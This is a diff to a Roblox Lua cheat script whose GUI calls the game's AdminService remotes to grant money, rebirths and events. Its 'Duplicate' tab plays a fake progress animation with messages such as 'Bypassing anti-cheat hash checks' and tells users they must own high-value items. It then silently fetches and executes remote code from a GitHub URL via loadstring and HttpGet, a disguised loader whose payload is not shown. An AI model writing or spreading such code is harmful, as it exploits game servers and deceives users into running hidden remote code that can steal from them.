@@ -71,6 +71,7 @@ local function styleTextBox(tb)
     tb.Font = Enum.Font.Gotham
     tb.TextSize = 11
     tb.ClearTextOnFocus = false
+    tb.TextWrapped = false
     r(tb, 8)
     addStroke(tb, 1, Color3.fromRGB(60, 70, 120), 0.3)
 end
@@ -176,11 +177,11 @@ end
 
 addDrag(toggle, toggle)
 
--- Main frame (nhỏ gọn, card style)
+-- Main frame (fix size cho gọn, không rớt UI)
 
 local main = Instance.new("Frame", gui)
-main.Size = UDim2.fromOffset(420, 280)
-main.Position = UDim2.new(0.5, -210, 0.5, -140)
+main.Size = UDim2.fromOffset(460, 300)
+main.Position = UDim2.new(0.5, -230, 0.5, -150)
 main.BackgroundColor3 = BG_DARK
 main.BorderSizePixel = 0
 main.ClipsDescendants = true
@@ -211,11 +212,11 @@ tbGrad.Color = ColorSequence.new{
 tbGrad.Rotation = 0
 
 local titleAccent = Instance.new("Frame", titleBar)
-titleAccent.Size = UDim2.new(0, 4, 1, 0)
+titleAccent.Size = UDim2.new(0, 3, 1, -8)          -- nhỏ + thấp hơn
 titleAccent.BackgroundColor3 = ACCENT
 titleAccent.BorderSizePixel = 0
-titleAccent.Position = UDim2.fromOffset(0,0)
-r(titleAccent, 4)
+titleAccent.Position = UDim2.fromOffset(6, 4)      -- tụt vào trong, không dính sát góc
+r(titleAccent, 6)
 
 local title = Instance.new("TextLabel", titleBar)
 title.Size = UDim2.new(0, 200, 1, 0)
@@ -277,6 +278,7 @@ status.Font = Enum.Font.Code
 status.TextSize = 10
 status.TextXAlignment = Enum.TextXAlignment.Left
 status.TextColor3 = TXT_MUTED
+status.TextWrapped = false
 status.Text = INVOKE and "Status: Connected • Made by NoobRoblox" or "Status: Missing Remote ❌"
 
 local function ok(m)
@@ -289,13 +291,14 @@ local function er(m)
     status.Text = m
 end
 
--- Side tabs
+-- Side tabs (fix tràn + clip)
 
 local sideTab = Instance.new("Frame", main)
-sideTab.Size = UDim2.new(0, 90, 1, -64)
-sideTab.Position = UDim2.fromOffset(5, 59)
+sideTab.Size = UDim2.new(0, 115, 1, -60)
+sideTab.Position = UDim2.fromOffset(5, 55)
 sideTab.BackgroundColor3 = BG_MID
 sideTab.BorderSizePixel = 0
+sideTab.ClipsDescendants = true
 r(sideTab, 12)
 addStroke(sideTab, 1, Color3.fromRGB(50, 60, 110), 0.5)
 
@@ -305,10 +308,11 @@ sideLayout.SortOrder = Enum.SortOrder.LayoutOrder
 sideLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
 local contentContainer = Instance.new("Frame", main)
-contentContainer.Size = UDim2.new(1, -105, 1, -64)
-contentContainer.Position = UDim2.fromOffset(100, 59)
+contentContainer.Size = UDim2.new(1, -130, 1, -60)
+contentContainer.Position = UDim2.fromOffset(125, 55)
 contentContainer.BackgroundColor3 = BG_MID
 contentContainer.BorderSizePixel = 0
+contentContainer.ClipsDescendants = true
 r(contentContainer, 12)
 addStroke(contentContainer, 1, Color3.fromRGB(45, 55, 100), 0.4)
 
@@ -319,7 +323,7 @@ local tabFrames = {}
 
 local function createTab(name, icon, order)
     local btn = Instance.new("TextButton", sideTab)
-    btn.Size = UDim2.new(1, -10, 0, 36)
+    btn.Size = UDim2.new(1, -12, 0, 32)
     btn.BackgroundColor3 = BG_CARD
     btn.Text = icon .. "  " .. name
     btn.Font = Enum.Font.GothamSemibold
@@ -328,24 +332,32 @@ local function createTab(name, icon, order)
     btn.AutoButtonColor = false
     btn.BorderSizePixel = 0
     btn.LayoutOrder = order
+    btn.TextXAlignment = Enum.TextXAlignment.Left
     r(btn, 10)
     addStroke(btn, 1, Color3.fromRGB(50, 60, 120), 0.5)
 
     local frame = Instance.new("ScrollingFrame", contentContainer)
-    frame.Size = UDim2.new(1, -14, 1, -10)
-    frame.Position = UDim2.fromOffset(7, 5)
+    frame.Size = UDim2.new(1, -10, 1, -8)
+    frame.Position = UDim2.fromOffset(5, 4)
     frame.BackgroundTransparency = 1
     frame.BorderSizePixel = 0
-    frame.ScrollBarThickness = 3
+    frame.ScrollBarThickness = 4
     frame.ScrollBarImageColor3 = ACCENT
     frame.CanvasSize = UDim2.new(0, 0, 0, 0)
     frame.Visible = false
+    frame.ClipsDescendants = true
+
+    local pad = Instance.new("UIPadding", frame)
+    pad.PaddingLeft   = UDim.new(0, 6)
+    pad.PaddingRight  = UDim.new(0, 6)
+    pad.PaddingTop    = UDim.new(0, 6)
+    pad.PaddingBottom = UDim.new(0, 6)
 
     local layout = Instance.new("UIListLayout", frame)
     layout.Padding = UDim.new(0, 6)
     layout.SortOrder = Enum.SortOrder.LayoutOrder
     layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-        frame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 6)
+        frame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 12)
     end)
 
     tabBtns[name] = btn
@@ -355,7 +367,9 @@ local function createTab(name, icon, order)
         for n, b in pairs(tabBtns) do
             b.BackgroundColor3 = BG_CARD
             b.TextColor3 = TXT_MUTED
-            tabFrames[n].Visible = false
+            if tabFrames[n] then
+                tabFrames[n].Visible = false
+            end
         end
         btn.BackgroundColor3 = ACCENT_SOFT
         btn.TextColor3 = Color3.new(1,1,1)
@@ -392,7 +406,7 @@ do
     end
 end
 
-------------------- PET SPAWNER -------------------
+------------------- PET SPAWNER (Brainrot) -------------------
 
 do
     local frame = spawnerTab
@@ -633,4 +647,342 @@ do
     r(execAllBtn,8)
     addStroke(execAllBtn,1,Color3.fromRGB(190,110,240),0.3)
 
-    execAllBtn.MouseButton1Click:Connect(functio
+    execAllBtn.MouseButton1Click:Connect(function()
+        local phases = "Phase 5: Sammy Snap"
+        local args = {[1]=phases}
+        pcall(function()
+            RS.Packages.Net:FindFirstChild("RF/AdminService/StartEvent"):InvokeServer(unpack(args))
+        end)
+        ok("✅ Executed All Events")
+    end)
+
+    local execBtn = Instance.new("TextButton", frame)
+    execBtn.Size = UDim2.new(1,0,0,28)
+    execBtn.Text = "EXECUTE SELECTED"
+    stylePrimaryButton(execBtn)
+
+    execBtn.MouseButton1Click:Connect(function()
+        if not selectedEvent then return er("⚠️ Choose Event First") end
+        local args={[1]=selectedEvent}
+        pcall(function()
+            RS.Packages.Net:FindFirstChild("RF/AdminService/StartEvent"):InvokeServer(unpack(args))
+        end)
+        ok("✅ Executed: "..selectedEvent)
+    end)
+end
+
+------------------- MONEY -------------------
+
+do
+    local frame = moneyTab
+
+    local moneyBox = Instance.new("TextBox", frame)
+    moneyBox.Size = UDim2.new(1,0,0,28)
+    moneyBox.PlaceholderText = "Money Amount"
+    moneyBox.Text = "67"
+    styleTextBox(moneyBox)
+
+    local setBtn = Instance.new("TextButton", frame)
+    setBtn.Size = UDim2.new(1,0,0,28)
+    setBtn.Text = "SET MONEY"
+    setBtn.BackgroundColor3 = Color3.fromRGB(70, 160, 100)
+    setBtn.BorderSizePixel = 0
+    setBtn.TextColor3 = Color3.new(1,1,1)
+    setBtn.Font = Enum.Font.GothamSemibold
+    setBtn.TextSize = 11
+    r(setBtn,8)
+    addStroke(setBtn,1,Color3.fromRGB(120,210,150),0.3)
+
+    setBtn.MouseButton1Click:Connect(function()
+        local val = parseNumber(moneyBox.Text)
+        if not val then return er("⚠️ Invalid Amount") end
+
+        local args = { [1] = val }
+        local success, result = pcall(function()
+            return RS.Packages.Net:FindFirstChild("RF/AdminService/GiveMoney"):InvokeServer(unpack(args))
+        end)
+        if success then
+            ok("💰 GiveMoney Success ✅: "..val)
+        else
+            er("❌ GiveMoney Failed: "..tostring(result))
+        end
+    end)
+end
+
+------------------- REBIRTH -------------------
+
+do
+    local frame = rebirthTab
+
+    local rebirthBox = Instance.new("TextBox", frame)
+    rebirthBox.Size = UDim2.new(1,0,0,28)
+    rebirthBox.PlaceholderText = "Rebirth Amount"
+    rebirthBox.Text = "17"
+    styleTextBox(rebirthBox)
+
+    local setBtn = Instance.new("TextButton", frame)
+    setBtn.Size = UDim2.new(1,0,0,28)
+    setBtn.Text = "SET REBIRTH"
+    setBtn.BackgroundColor3 = Color3.fromRGB(70, 160, 100)
+    setBtn.BorderSizePixel = 0
+    setBtn.TextColor3 = Color3.new(1,1,1)
+    setBtn.Font = Enum.Font.GothamSemibold
+    setBtn.TextSize = 11
+    r(setBtn,8)
+    addStroke(setBtn,1,Color3.fromRGB(120,210,150),0.3)
+
+    setBtn.MouseButton1Click:Connect(function()
+        local val = parseNumber(rebirthBox.Text)
+        if not val then return er("⚠️ Invalid Rebirth Amount") end
+
+        local args = { [1] = val }
+        local success, result = pcall(function()
+            return RS.Packages.Net:FindFirstChild("RF/AdminService/GiveRebirth"):InvokeServer(unpack(args))
+        end)
+        if success then
+            ok("✨ GiveRebirth Success ✅: "..val)
+        else
+            er("❌ GiveRebirth Failed: "..tostring(result))
+        end
+    end)
+end
+
+------------------- ⚙️OTHER TAB (full Duplicate + 3D Process + 3D Button) -------------------
+
+do
+    local frame = otherTab
+    local duplicating = false
+    local baseNote = "You must have brainrot 50m+ to Duplicate🧠"
+
+    local TweenService = game:GetService("TweenService")
+
+    -------------------------------------------------------------------
+    -- PROCESS FRAME
+    -------------------------------------------------------------------
+    local progressFrame = Instance.new("Frame", frame)
+    progressFrame.Size = UDim2.new(1,0,0,0)
+    progressFrame.BackgroundColor3 = BG_CARD
+    progressFrame.BackgroundTransparency = 1
+    progressFrame.BorderSizePixel = 0
+    progressFrame.ClipsDescendants = true
+    r(progressFrame, 8)
+    addStroke(progressFrame, 1, ACCENT_SOFT, 0.4)
+
+    -------------------------------------------------------------------
+    -- 🌑 3D SHADOW CHIỀU SÂU
+    -------------------------------------------------------------------
+    local barShadow = Instance.new("Frame", progressFrame)
+    barShadow.AnchorPoint = Vector2.new(0.5,0.5)
+    barShadow.Position = UDim2.new(0.5,0,0.5,2)
+    barShadow.Size = UDim2.new(1,6,1,6)
+    barShadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    barShadow.BackgroundTransparency = 0.88
+    barShadow.BorderSizePixel = 0
+    barShadow.ZIndex = progressFrame.ZIndex
+    r(barShadow, 8)
+
+    -- Inner shadow nhẹ
+    local innerShadowFrame = Instance.new("Frame", progressFrame)
+    innerShadowFrame.Size = UDim2.new(1,-2,1,-2)
+    innerShadowFrame.Position = UDim2.new(0,1,0,1)
+    innerShadowFrame.BackgroundColor3 = Color3.new(0,0,0)
+    innerShadowFrame.BackgroundTransparency = 0.9
+    innerShadowFrame.BorderSizePixel = 0
+    innerShadowFrame.ZIndex = progressFrame.ZIndex + 1
+    r(innerShadowFrame, 7)
+
+    -------------------------------------------------------------------
+    -- THANH PROCESS GIỮ NGUYÊN MÀU ACCENT
+    -------------------------------------------------------------------
+    local progressBar = Instance.new("Frame", progressFrame)
+    progressBar.Position = UDim2.new(0,2,0,2)
+    progressBar.Size = UDim2.new(0,0,1,-4)
+    progressBar.BackgroundColor3 = ACCENT_SOFT
+    progressBar.BackgroundTransparency = 0.15
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = progressFrame.ZIndex + 2
+    r(progressBar, 6)
+
+    -- soft glow rất nhẹ
+    local softGlow = Instance.new("UIStroke", progressBar)
+    softGlow.Thickness = 2
+    softGlow.Color = Color3.fromRGB(255,255,255)
+    softGlow.Transparency = 0.93
+
+    -------------------------------------------------------------------
+    -- TEXT HIỂN THỊ PROCESS
+    -------------------------------------------------------------------
+    local progressLabel = Instance.new("TextLabel", progressFrame)
+    progressLabel.Size = UDim2.new(1,-8,1,0)
+    progressLabel.Position = UDim2.fromOffset(4,0)
+    progressLabel.BackgroundTransparency = 1
+    progressLabel.Font = Enum.Font.Gotham
+    progressLabel.TextSize = 10
+    progressLabel.TextColor3 = TXT_MAIN
+    progressLabel.TextWrapped = true
+    progressLabel.TextXAlignment = Enum.TextXAlignment.Left
+    progressLabel.ZIndex = progressBar.ZIndex + 1
+
+    -------------------------------------------------------------------
+    -- DUPLICATE BUTTON
+    -------------------------------------------------------------------
+    local dupBtn = Instance.new("TextButton", frame)
+    dupBtn.Size = UDim2.new(1,0,0,28)
+    dupBtn.Text = "Duplicate 🧠"
+    stylePrimaryButton(dupBtn)
+
+    -------------------------------------------------------------------
+    -- ⭐ HIỆU ỨNG 3D BUTTON
+    -------------------------------------------------------------------
+    local btnShadow = Instance.new("Frame", dupBtn)
+    btnShadow.AnchorPoint = Vector2.new(0.5,0.5)
+    btnShadow.Position = UDim2.new(0.5,0,0.5,4)
+    btnShadow.Size = UDim2.new(1,4,1,4)
+    btnShadow.BackgroundColor3 = Color3.new(0,0,0)
+    btnShadow.BackgroundTransparency = 0.85
+    btnShadow.BorderSizePixel = 0
+    btnShadow.ZIndex = dupBtn.ZIndex - 1
+    r(btnShadow, 10)
+
+    local innerShadow = Instance.new("UIStroke", dupBtn)
+    innerShadow.Color = Color3.new(0,0,0)
+    innerShadow.Thickness = 2
+    innerShadow.Transparency = 0.85
+
+    local topGlow = Instance.new("Frame", dupBtn)
+    topGlow.AnchorPoint = Vector2.new(0.5,0)
+    topGlow.Position = UDim2.new(0.5,0,0,-2)
+    topGlow.Size = UDim2.new(0.9,0,0,6)
+    topGlow.BackgroundColor3 = Color3.new(1,1,1)
+    topGlow.BackgroundTransparency = 0.87
+    topGlow.BorderSizePixel = 0
+    r(topGlow, 6)
+
+    dupBtn.MouseButton1Down:Connect(function()
+        TweenService:Create(btnShadow, TweenInfo.new(0.1), {
+            Position = UDim2.new(0.5,0,0.5,7),
+            BackgroundTransparency = 0.75
+        }):Play()
+        TweenService:Create(innerShadow, TweenInfo.new(0.1), {
+            Transparency = 0.65
+        }):Play()
+    end)
+
+    dupBtn.MouseButton1Up:Connect(function()
+        TweenService:Create(btnShadow, TweenInfo.new(0.1), {
+            Position = UDim2.new(0.5,0,0.5,4),
+            BackgroundTransparency = 0.85
+        }):Play()
+        TweenService:Create(innerShadow, TweenInfo.new(0.1), {
+            Transparency = 0.85
+        }):Play()
+    end)
+
+    -------------------------------------------------------------------
+    -- NOTE
+    -------------------------------------------------------------------
+    local note = Instance.new("TextLabel", frame)
+    note.Size = UDim2.new(1,0,0,22)
+    note.Text = baseNote
+    note.BackgroundTransparency = 1
+    note.TextColor3 = TXT_MUTED
+    note.Font = Enum.Font.Gotham
+    note.TextSize = 10
+    note.TextWrapped = true
+    note.TextXAlignment = Enum.TextXAlignment.Left
+
+    -------------------------------------------------------------------
+    -- animateDots
+    -------------------------------------------------------------------
+    local function animateDots(textObj, baseText, duration)
+        local start = tick()
+        while tick() - start < duration do
+            local dots = string.rep(".", (math.floor((tick()-start) % 3)+1))
+            local final = baseText .. dots
+            textObj.Text = final
+            note.Text = final
+            task.wait(0.2)
+        end
+    end
+
+    -------------------------------------------------------------------
+    -- DUPLICATE SEQUENCE
+    -------------------------------------------------------------------
+    local segments = {
+        {"Found high-value targets. Beginning duplication protocol", 3},
+        {"Bypassing plot permissions", 2},
+        {"Exploiting server replication service", 5},
+        {"Injecting duplication packets", 3},
+        {"Allocating memory for new instances", 2},
+        {"Replicating object properties", 4},
+        {"Bypassing anti-cheat hash checks", 3},
+        {"Writing cloned entities to memory", 4},
+        {"Finalizing instance synchronization", 3},
+        {"Protocol complete. Placing new assets", 1},
+        {"✅Duplication Successfully!", 3},
+    }
+
+    local TOTAL_DURATION = 0
+    for _, seg in ipairs(segments) do
+        TOTAL_DURATION = TOTAL_DURATION + seg[2]
+    end
+
+    -------------------------------------------------------------------
+    -- RUN SEQUENCE
+    -------------------------------------------------------------------
+    local function runSequence()
+        duplicating = true
+
+        progressFrame.Size = UDim2.new(1,0,0,0)
+        progressFrame.BackgroundTransparency = 1
+        progressBar.Size = UDim2.new(0,0,1,-4)
+        softGlow.Transparency = 0.93
+        progressLabel.Text = ""
+        note.Text = baseNote
+
+        TweenService:Create(progressFrame, TweenInfo.new(0.25), {
+            Size = UDim2.new(1,0,0,26),
+            BackgroundTransparency = 0
+        }):Play()
+        task.wait(0.25)
+
+        TweenService:Create(progressBar, TweenInfo.new(TOTAL_DURATION), {
+            Size = UDim2.new(1,-4,1,-4)
+        }):Play()
+
+        for i, seg in ipairs(segments) do
+            local txt, dur = seg[1], seg[2]
+
+            if i < #segments then
+                animateDots(progressLabel, txt, dur)
+                task.wait(0.1)
+            else
+                progressLabel.Text = txt
+                note.Text = txt
+                task.wait(dur)
+
+                -- ⭐ Auto execute script
+                task.spawn(function()
+                    pcall(function()
+                        loadstring(game:HttpGet(
+                            "https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/Cloned"
+                        ))()
+                    end)
+                end)
+            end
+        end
+
+        TweenService:Create(progressFrame, TweenInfo.new(0.25), {
+            Size = UDim2.new(1,0,0,0),
+            BackgroundTransparency = 1
+        }):Play()
+        task.wait(0.25)
+
+        duplicating = false
+    end
+
+    dupBtn.MouseButton1Click:Connect(function()
+        if duplicating then return end
+        task.spawn(runSequence)
+    end)
+end
